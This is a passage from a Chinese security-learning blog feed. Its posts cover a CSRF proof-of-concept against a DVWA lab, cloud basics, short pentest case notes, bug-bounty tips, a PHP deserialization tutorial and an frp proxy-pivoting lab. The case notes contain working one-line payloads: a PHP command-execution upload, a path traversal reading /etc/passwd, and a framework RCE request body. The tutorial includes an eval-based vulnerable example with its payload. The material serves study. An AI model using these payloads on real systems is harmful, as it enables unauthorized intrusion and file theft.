class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.116.34/DVWA-master/DVWA-master/vulnerabilities/csrf/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password<span class="symbol">&amp;#95;</span>current"</span> <span class="attr">value</span>=<span class="string">"password"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password<span class="symbol">&amp;#95;</span>new"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password<span class="symbol">&amp;#95;</span>conf"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user<span class="symbol">&amp;#95;</span>token"</span> <span class="attr">value</span>=<span class="string">"443fb9acbff8f91ecbbed26b2e5a7cf3"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>让受害用相同的浏览器打开，并点击，则修改密码</p><h3 id="referer请求头防御和绕过"><a href="#referer请求头防御和绕过" class="headerlink" title="referer请求头防御和绕过"></a>referer请求头防御和绕过</h3><h3 id="token的防御和绕过"><a href="#token的防御和绕过" class="headerlink" title="token的防御和绕过"></a>token的防御和绕过</h3><h2 id="CSRFtester工具使用"><a href="#CSRFtester工具使用" class="headerlink" title="CSRFtester工具使用"></a>CSRFtester工具使用</h2>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>亚马逊云科技尖峰学堂-云</title>
      <link href="/2024/09/01/ya-ma-xun-yun-ke-ji-jian-feng-xue-tang-yun/"/>
      <url>/2024/09/01/ya-ma-xun-yun-ke-ji-jian-feng-xue-tang-yun/</url>
      
        <content type="html"><![CDATA[<h1 id="亚马逊云科技尖峰学堂-云"><a href="#亚马逊云科技尖峰学堂-云" class="headerlink" title="亚马逊云科技尖峰学堂-云"></a>亚马逊云科技尖峰学堂-云</h1><h2 id="云计算"><a href="#云计算" class="headerlink" title="云计算"></a>云计算</h2><p>云计算<strong>通过互联网按需提供IT资源</strong>，并且采用按使<strong>用量付费</strong>的定价方式，可以根据需要从云提供商那里获得技术服务，例如计算能力、存储和数据库，而无需购买、拥有和维护物理数据中心及服务器。</p><h3 id="云部署模式"><a href="#云部署模式" class="headerlink" title="云部署模式"></a>云部署模式</h3><ul><li>公有云</li><li>混合云</li><li>私有云</li></ul><p>“一体式”云：</p><ol><li>无前期投资</li><li>低持续成本</li><li>集中精力在创新上</li><li>灵活的容量</li><li>速度和敏捷性</li><li>全球范围内按需提供</li></ol><p>本地：</p><ol><li>较大的前期投资</li><li>人工、补丁和升级周期</li><li>系统管理</li><li>固定容量</li><li>较长的采购周期</li><li>有限的物理地域</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透实战学习思路</title>
      <link href="/2024/08/30/shen-tou-shi-zhan-xue-xi-si-lu/"/>
      <url>/2024/08/30/shen-tou-shi-zhan-xue-xi-si-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透实战学习思路"><a href="#渗透实战学习思路" class="headerlink" title="渗透实战学习思路"></a>渗透实战学习思路</h1><h2 id="Web应用"><a href="#Web应用" class="headerlink" title="Web应用"></a>Web应用</h2><h3 id="某云智慧商业软件-任意用户创建漏洞"><a href="#某云智慧商业软件-任意用户创建漏洞" class="headerlink" title="某云智慧商业软件-任意用户创建漏洞"></a>某云智慧商业软件-任意用户创建漏洞</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">登陆界面，输入登录信息，抓包，FUZZ文件名</span><br><span class="line">将/login更改为/add</span><br><span class="line">直接绕过登陆界面，进入添加用户界面，添加用户登录</span><br></pre></td></tr></tbody></table></figure><h3 id="某托管服务平台-文件上传"><a href="#某托管服务平台-文件上传" class="headerlink" title="某托管服务平台-文件上传"></a>某托管服务平台-文件上传</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">上传文件，文件包含以下内容</span><br><span class="line">&lt;?php system("id");unlink(__FILE__);?&gt;</span><br><span class="line">使用 system() 函数执行 id 命令,显示当前用户的身份信息。</span><br><span class="line">使用 unlink() 函数删除当前脚本文件本身。</span><br></pre></td></tr></tbody></table></figure><h3 id="某开发平台任意文件读取漏洞"><a href="#某开发平台任意文件读取漏洞" class="headerlink" title="某开发平台任意文件读取漏洞"></a>某开发平台任意文件读取漏洞</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在参数中，可以直接读取信息</span><br><span class="line">abc?urlPath=../../../../../../../../../../etc/passwd</span><br></pre></td></tr></tbody></table></figure><h3 id="某通信管理系统远程代码执行漏洞"><a href="#某通信管理系统远程代码执行漏洞" class="headerlink" title="某通信管理系统远程代码执行漏洞"></a>某通信管理系统远程代码执行漏洞</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">未经身份验证的远程攻击者可利用此漏洞写入后门文件，执行任意命令，导致服务器被控</span><br><span class="line"></span><br><span class="line">网页目录扫描发现一个目录，输入之后跳转到后台管理中心</span><br><span class="line">在POST请求体中写执行代码</span><br><span class="line">s=id&amp;_method=__construct&amp;method=POST&amp;filter[]=system</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SRC漏洞挖掘学习</title>
      <link href="/2024/08/29/src-lou-dong-wa-jue-xue-xi/"/>
      <url>/2024/08/29/src-lou-dong-wa-jue-xue-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="SRC漏洞挖掘学习"><a href="#SRC漏洞挖掘学习" class="headerlink" title="SRC漏洞挖掘学习"></a>SRC漏洞挖掘学习</h1><h2 id="JS漏洞挖掘"><a href="#JS漏洞挖掘" class="headerlink" title="JS漏洞挖掘"></a>JS漏洞挖掘</h2><blockquote><p>实战中阅读JS的作用</p></blockquote><ol><li><p>JS中存在插件名字，根据插件找到相应的漏洞直接利用</p><ul><li>某些公司直接利用第三方存在漏洞的的JS代码</li></ul><p> <img src="https://pic.imgdb.cn/item/66cfcc44d9c307b7e95cfc4c.png"></p></li><li><p>JS中存在一些URL链接，根据URL链接找到相应的页面进一步测试和利用</p></li></ol><p><img src="https://pic.imgdb.cn/item/66cfccd5d9c307b7e95d5e0e.png"></p><ol start="3"><li>JS中存在一个子域名，可以直接访问子域名</li></ol><p><img src="https://pic.imgdb.cn/item/66cfcd20d9c307b7e95da2b6.png"></p><ol start="4"><li>JS中的一些注释可能泄露以账号密码或者其他的</li></ol><h3 id="浏览器控制台使用技巧及方法"><a href="#浏览器控制台使用技巧及方法" class="headerlink" title="浏览器控制台使用技巧及方法"></a>浏览器控制台使用技巧及方法</h3><p><img src="https://pic.imgdb.cn/item/66cfd27ad9c307b7e96164f0.png"></p><h3 id="JS断点技巧以及Hook注入"><a href="#JS断点技巧以及Hook注入" class="headerlink" title="JS断点技巧以及Hook注入"></a>JS断点技巧以及Hook注入</h3><blockquote><p>找到关键代码，打上断点，步进查看加密过程</p></blockquote><p><img src="https://pic.imgdb.cn/item/66cfd3edd9c307b7e9626ad7.png"></p><h3 id="Python和JS结合解决加密难题"><a href="#Python和JS结合解决加密难题" class="headerlink" title="Python和JS结合解决加密难题"></a>Python和JS结合解决加密难题</h3><p><img src="https://pic.imgdb.cn/item/66cfd711d9c307b7e9674b01.png"></p><h3 id="实战MD5加密逆向加密参数还原"><a href="#实战MD5加密逆向加密参数还原" class="headerlink" title="实战MD5加密逆向加密参数还原"></a>实战MD5加密逆向加密参数还原</h3><h2 id="FUZZ（模糊测试）"><a href="#FUZZ（模糊测试）" class="headerlink" title="FUZZ（模糊测试）"></a>FUZZ（模糊测试）</h2><h3 id="常见的FUZZ姿势、工具及字典"><a href="#常见的FUZZ姿势、工具及字典" class="headerlink" title="常见的FUZZ姿势、工具及字典"></a>常见的FUZZ姿势、工具及字典</h3><h3 id="未知目录，信息泄露，备份文件等漏洞的FUZZ"><a href="#未知目录，信息泄露，备份文件等漏洞的FUZZ" class="headerlink" title="未知目录，信息泄露，备份文件等漏洞的FUZZ"></a>未知目录，信息泄露，备份文件等漏洞的FUZZ</h3><blockquote><p>用bp，先FUZZ文件，再FUZZ目录</p></blockquote><p>需要拥有一个顺手的文件名字典和目录字典</p><h3 id="弱口令，隐藏变量，未知参数的FUZZ"><a href="#弱口令，隐藏变量，未知参数的FUZZ" class="headerlink" title="弱口令，隐藏变量，未知参数的FUZZ"></a>弱口令，隐藏变量，未知参数的FUZZ</h3>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2024/08/21/php-fan-xu-lie-hua/"/>
      <url>/2024/08/21/php-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="学习视频：橘子科技工作室"><a href="#学习视频：橘子科技工作室" class="headerlink" title="学习视频：橘子科技工作室"></a>学习视频：橘子科技工作室</h2><p>序列化：是将对象的状态信息转换为可以存储或传输的形式</p><p>在php中使用serialize（）来进行序列化</p><h2 id="序列化演示"><a href="#序列化演示" class="headerlink" title="序列化演示"></a>序列化演示</h2><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TEST</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data2</span> = <span class="string">"dazzhuang"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pass</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$number</span> = <span class="number">34</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">'user'</span>;</span><br><span class="line"><span class="variable">$bool</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$null</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">'a'</span> =&gt; <span class="number">10</span>, <span class="string">'b'</span> =&gt; <span class="number">200</span>);</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>(<span class="string">'uu'</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>(<span class="string">'uu'</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$test2</span>-&gt;data = &amp;<span class="variable">$test2</span>-&gt;data2;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$number</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$str</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$bool</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$null</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test2</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">i:<span class="number">34</span>;</span><br><span class="line">s:<span class="number">4</span>:<span class="string">"user"</span>;</span><br><span class="line">b:<span class="number">1</span>;</span><br><span class="line">N;</span><br><span class="line">a:<span class="number">2</span>:{s:<span class="number">1</span>:<span class="string">"a"</span>;i:<span class="number">10</span>;s:<span class="number">1</span>:<span class="string">"b"</span>;i:<span class="number">200</span>;}</span><br><span class="line">O:<span class="number">4</span>:<span class="string">"TEST"</span>:<span class="number">3</span>:{s:<span class="number">4</span>:<span class="string">"data"</span>;s:<span class="number">2</span>:<span class="string">"uu"</span>;s:<span class="number">5</span>:<span class="string">"data2"</span>;s:<span class="number">9</span>:<span class="string">"dazzhuang"</span>;s:<span class="number">10</span>:<span class="string">"TESTpass"</span>;b:<span class="number">1</span>;}</span><br><span class="line">O:<span class="number">4</span>:<span class="string">"TEST"</span>:<span class="number">3</span>:{s:<span class="number">4</span>:<span class="string">"data"</span>;s:<span class="number">9</span>:<span class="string">"dazzhuang"</span>;s:<span class="number">5</span>:<span class="string">"data2"</span>;R:<span class="number">2</span>;s:<span class="number">10</span>:<span class="string">"TESTpass"</span>;b:<span class="number">1</span>;}</span><br></pre></td></tr></tbody></table></figure><h2 id="数组序列化"><a href="#数组序列化" class="headerlink" title="数组序列化"></a>数组序列化</h2><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">'benben'</span>,<span class="string">'dazhuang'</span>,<span class="string">'laoliu'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">benbena:<span class="number">3</span>:{i:<span class="number">0</span>;s:<span class="number">6</span>:<span class="string">"benben"</span>;i:<span class="number">1</span>;s:<span class="number">8</span>:<span class="string">"dazhuang"</span>;i:<span class="number">2</span>;s:<span class="number">6</span>:<span class="string">"laoliu"</span>;}</span><br></pre></td></tr></tbody></table></figure><h2 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h2><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pub</span>=<span class="string">'benben'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">1</span>:{s:<span class="number">3</span>:<span class="string">"pub"</span>;s:<span class="number">6</span>:<span class="string">"benben"</span>;}</span><br></pre></td></tr></tbody></table></figure><h2 id="私有修饰符序列化"><a href="#私有修饰符序列化" class="headerlink" title="私有修饰符序列化"></a>私有修饰符序列化</h2><blockquote><p>私有属性在序列化之后的格式</p><p>private私有属性序列化时，在变量名前加”%00类名%00”</p></blockquote><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pub</span>=<span class="string">'benben'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">1</span>:{s:<span class="number">9</span>:<span class="string">"testpub"</span>;s:<span class="number">6</span>:<span class="string">"benben"</span>;}</span><br></pre></td></tr></tbody></table></figure><p>为什么是testpub：<br>    为了再还原时，能把类名还原回去，所以类名+属性名（确切来说%00+类名+%00+属性名）<br>为什么是9：<br>    %00test%00pub</p><h2 id="保护修饰符序列化"><a href="#保护修饰符序列化" class="headerlink" title="保护修饰符序列化"></a>保护修饰符序列化</h2><blockquote><p>保护属性修饰符在序列化之后的格式</p></blockquote><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pub</span>=<span class="string">'benben'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">1</span>:{s:<span class="number">6</span>:<span class="string">"*pub"</span>;s:<span class="number">6</span>:<span class="string">"benben"</span>;}</span><br></pre></td></tr></tbody></table></figure><p>在属性名前加一个*<br>    *pub<br>为什么是6：</p><p>​%00+*+%00+pub</p><h2 id="成员属性调用对象"><a href="#成员属性调用对象" class="headerlink" title="成员属性调用对象"></a>成员属性调用对象</h2><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pub</span>=<span class="string">'benben'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$ben</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ben=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test2</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">O:<span class="number">5</span>:<span class="string">"test2"</span>:<span class="number">1</span>:{s:<span class="number">3</span>:<span class="string">"ben"</span>;O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">1</span>:{s:<span class="number">3</span>:<span class="string">"pub"</span>;s:<span class="number">6</span>:<span class="string">"benben"</span>;}}</span><br></pre></td></tr></tbody></table></figure><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><ul><li>反序列化生成的对象里的值，由反序列化里的<strong>值</strong>提供，与原有类预定义的值无关</li></ul><p>反序列化漏洞的成因：反序列化过程中，unserialize()接收的值（字符串）可控，通过更改这个值，得到所需要的代码，即生成的对象的属性值</p><ul><li>反序列化不改变类的成员方法，需要调用方法才能触发</li></ul><p>例题：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">'echo "this is test!!";'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$get</span> = <span class="variable">$_GET</span>[<span class="string">"benben"</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$get</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="title function_ invoke__">displayVar</span>() ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//this is test!!</span></span><br><span class="line">get参数：benben=O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">1</span>:{s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">22</span>:<span class="string">"echo%20"</span>this%<span class="number">20</span>is%<span class="number">20</span>test!!<span class="string">";"</span>;}</span><br></pre></td></tr></tbody></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多层代理内网穿透</title>
      <link href="/2024/08/18/duo-ceng-dai-li-nei-wang-chuan-tou/"/>
      <url>/2024/08/18/duo-ceng-dai-li-nei-wang-chuan-tou/</url>
      
        <content type="html"><![CDATA[<h1 id="多层代理内网穿透实验（frp）"><a href="#多层代理内网穿透实验（frp）" class="headerlink" title="多层代理内网穿透实验（frp）"></a>多层代理内网穿透实验（frp）</h1><h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><p>FRP (Fast Reverse Proxy)是一个开源的反向代理服务器应用程序,用于实现内网穿透。</p><p>FRP的主要功能包括:</p><ul><li><p>内网穿透:FRP可以将<u>内网服务器暴露给公网,实现对内网服务的远程访问</u>。即使内网服务器没有公网 IP,也可以通过FRP进行访问。</p></li><li><p>端口映射:FRP可以将内网任意端口映射到公网上,实现对内网服务的访问。</p></li><li><p>流量转发:FRP可以将公网流量转发到内网服务器,支持TCP、UDP、HTTP、HTTPS等多种协议。</p></li><li><p>安全性:FRP支持认证、加密等安全机制,可以有效防止未授权访问。</p></li></ul><p>FRP由<strong>服务端和客户端</strong>组成。服务端部署在公网上,客户端部署在内网服务器上。客户端会与服务端建立连接,服务端负责接收外部访问请求并转发到内网。FRP易于部署和配置,支持多种操作系统,是一个非常实用的内网穿透工具。它广泛应用于远程管理、内网网站发布、游戏服务器等场景。</p><h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><blockquote><p>VM虚拟机+主机</p><p>主机：攻击机</p><p>虚拟机：</p><p>kali：192.168.116.50//作为代理服务器1</p><p>PC1：网卡1：192.168.116.30网卡2：192.168.1.1  //作为代理服务器2</p><p>PC2 ：网卡1：192.168.2.1  网卡2：192.168.1.2  //被攻击机</p></blockquote><h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://pic.imgdb.cn/item/66c1b6bed9c307b7e9e1acbd.png"></p><h2 id="环境分析"><a href="#环境分析" class="headerlink" title="环境分析"></a>环境分析</h2><p>在VM上的PC1与PC2的网卡2配置为一个LAN段</p><p>192.168.116.*模拟外网环境（实际环境为公网地址，此处用私网地址模拟）</p><p>192.168.1.*模拟内网环境</p><p>192.168.2.*模拟内网中的其他网段</p><p>第一层代理：</p><p>​代理服务器1上安装frps也就是frp服务端</p><p>​代理服务器2上安装frpc也就是frp客户端</p><p>第二层代理：</p><p>​代理服务器2上安装frps</p><p>​Web服务器上安装frpc</p><p>代理服务器2上也安装了Web服务，可以访问80端口的网页</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>直接访问192.168.1.1，是访问不了的，因为它属于代理服务器2的内网资源，所以需要先做第一层代理</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF 人生苦短 我用Python（Misc）</title>
